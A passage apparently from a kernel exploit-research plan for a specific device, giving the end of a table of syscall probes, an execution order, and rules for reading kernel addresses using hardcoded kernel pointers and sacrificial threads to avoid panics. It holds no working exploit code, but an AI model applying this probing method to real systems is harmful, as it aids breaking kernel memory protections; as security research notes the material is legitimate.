| 10 | 620 MODE 5 | none directly | none (enabler) | process-only |

Rows are ordered by the requested criterion: probability of a kernel *address* read first, then
writability. Suggested execution order: 1 -> 8 -> 6 -> 2 -> 3 -> 4 -> 5 -> 9 -> 10 -> 7. Everything before 7 is safe against
the console; 7 is expected to cost a reboot.

## Rules every probe in this list obeys
1. User pointer only where a 0x8ac19xxx helper is on the path; kernel pointer only where a raw
   dereference is on the path. Mixing them is what panics.
2. One syscall per sacrificial child thread, buffers allocated on the main thread
   (docs/SACRIFICIAL_THREAD_14_10.md).
3. Never pass 0x0 or an unmapped address as a kernel pointer; use the TZ table (0xffffffff8e2d5920),
   its lock (0xffffffff8e2d5900) or its count (0xffffffff8e2d7920) as mapped anchors.
4. Every probe ends with `print("[Z] alive")` and `print("=== DONE ===")` so a wedge is
   distinguishable from a panic without the console.
